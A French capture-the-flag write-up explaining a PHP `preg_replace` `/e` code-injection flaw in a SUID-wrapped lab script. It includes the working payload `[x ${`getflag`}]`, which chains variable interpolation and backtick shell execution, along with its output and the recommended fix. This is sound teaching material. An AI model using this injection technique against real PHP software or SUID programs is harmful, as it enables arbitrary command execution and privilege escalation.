# Level06 — PHP `preg_replace` modificateur `/e` (Code Injection)

## 1. Reconnaissance

Dans le home de `level06` on trouve deux fichiers :

```sh
ls -la ~
# -rwsr-x---  1 flag06 level06  ...  level06        ← binaire SUID flag06
# -rw-r--r--  1 flag06 flag06   ...  level06.php    ← script lu par le binaire
```

- `level06` est un **wrapper SUID** appartenant à `flag06`. Il appelle le script PHP avec les droits de `flag06`.
- `level06.php` est **lisible par tous** → on peut auditer le code.

## 2. Lecture du code source

Version reformatée pour la lisibilité (équivalente fonctionnellement) :

```php
<?php
// y() : transformations cosmétiques sur une chaîne
function y($texte) {
    $texte = preg_replace("/\./", " x ", $texte);
    $texte = preg_replace("/@/",  " y",  $texte);
    return $texte;
}

// x() : lit un fichier et applique 3 substitutions
function x($chemin, $arg2_inutilise) {
    $contenu = file_get_contents($chemin);

    // ⚠️ LIGNE VULNÉRABLE
    $contenu = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $contenu);

    // Cosmétique : remplace [ et ] par ( et )
    $contenu = preg_replace("/\[/", "(", $contenu);
    $contenu = preg_replace("/\]/", ")", $contenu);

    return $contenu;
}

print x($argv[1], $argv[2]);
```

Comportement nominal : on passe un fichier en argument, le script remplace les motifs `[x foo]` par `y("foo")` (donc applique des transformations cosmétiques), puis convertit les crochets restants en parenthèses.

## 3. Où est la faille — le modificateur `/e`

La ligne suspecte :

```php
preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $contenu);
```

Le drapeau **`/e`** (déprécié depuis PHP 5.5, supprimé en 7.0) change radicalement le sens de `preg_replace` :

| Sans `/e` | Avec `/e` |
|-----------|-----------|
| Le 2e argument est traité comme une **chaîne de remplacement** littérale. | Le 2e argument est **évalué comme du code PHP** après substitution des captures. |

Concrètement, pour chaque match `[x SOMETHING]`, PHP construit la chaîne `y("SOMETHING")` puis **l'exécute via `eval()`**. Si on contrôle `SOMETHING`, on contrôle (en partie) le code PHP exécuté.

## 4. Construction du payload

Le contenu de la capture `(.*)` est inséré entre **guillemets doubles** dans le code évalué. Or PHP, dans une chaîne double-quotée :
- interpole `${expression}` comme une variable variable
- interpole les **backticks** `` ` ` `` comme une **substitution shell**

La syntaxe `${`cmd`}` combine les deux :

| Étape | Ce que PHP fait |
|-------|-----------------|
| 1 | Voit `${...}` → doit résoudre l'expression à l'intérieur |
| 2 | À l'intérieur trouve `` `cmd` `` → exécute `cmd` via le shell |
| 3 | Tente d'utiliser la sortie de `cmd` comme **nom de variable** |
| 4 | Cette variable n'existe pas → `Notice: Undefined variable: <sortie>` |

**Mais la commande a déjà tourné à l'étape 2** — et la sortie apparaît dans le message d'erreur à l'étape 4. C'est exactement ce qu'on veut.

Le binaire SUID exécute le PHP avec l'UID `flag06`, donc `getflag` tournera avec les droits suffisants.

## 5. Exploitation

```sh
# Crée un fichier qui matche le motif [x ...] avec le payload dedans
echo '[x ${`getflag`}]' > /tmp/payload

# Lance le binaire SUID
~/level06 /tmp/payload
```

Sortie observée :

```text
PHP Notice:  Undefined variable: Check flag.Here is your token : <TOKEN>
 in /home/user/level06/level06.php(4) : regexp code on line 1
```

Le token est dans le message d'erreur (champ "Undefined variable"). Il est enregistré dans `../flag`.

## 6. Vulnérabilité — résumé

**Cause racine** : utilisation de `preg_replace` avec le modificateur `/e` sur une entrée influencée par l'utilisateur. Cette fonctionnalité fait un `eval()` implicite et permet l'**injection de code PHP**, qui débouche ici sur une **injection de commande shell** via les backticks interpolés dans les chaînes double-quotées.

**Aggravé par** : le wrapper SUID qui élève les droits à `flag06` avant l'appel PHP.

**Correctif** : depuis PHP 5.5 il faut utiliser `preg_replace_callback`, qui passe le match à une fonction PHP au lieu de l'évaluer comme du code. PHP 7+ refuse purement et simplement le drapeau `/e`.
